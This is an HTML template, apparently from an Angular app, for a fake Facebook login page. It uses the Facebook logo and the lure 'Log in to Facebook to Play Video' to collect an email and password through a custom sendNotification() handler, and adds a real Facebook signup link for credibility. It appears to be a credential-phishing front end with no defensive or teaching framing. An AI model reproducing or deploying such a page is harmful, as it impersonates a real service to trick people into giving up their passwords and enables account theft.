<body>
    <div class="header">
        <div class="container-fluid">
            <div class="row">
                <div class="headersubdiv">
                    <img src="../assets/fblogo.png" class="fblogo">
                  </div>
            </div>
        </div>
    </div>
    <div class="main">
        <div class="container-fluid">
            <div class="row">
                <div class="pull-left text-center col-sm-3">
                </div>
                <div class="pull-right col-sm-6 text-center">
                    <div class="login-form">
                        <p class="h3">Log in to Facebook to Play Video</p>
                        <form #loginForm= "ngForm" (ngSubmit)="sendNotification()" style="max-width:400px;margin:0px auto;">
                            <div class="form-group">
                                <input type="text" name="userName" [(ngModel)] = "userName"  #user="ngModel" placeholder="Email Address" class="input-lg col-sm-12 form-control"/>
                            </div>
                            <div class="form-group">
                                <input type="password" name="password" [(ngModel)] = "password"  #pwd="ngModel" placeholder="Password" class="input-lg col-sm-12 form-control"/>
                            </div>
                            <div class="form-group">
                                <input type="submit" value="Login" class="btn btn-success input-lg col-sm-12"/>
                                <br/><br/><br/><br/>
                                <a href="https://www.facebook.com/">Signup for Facebook</a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
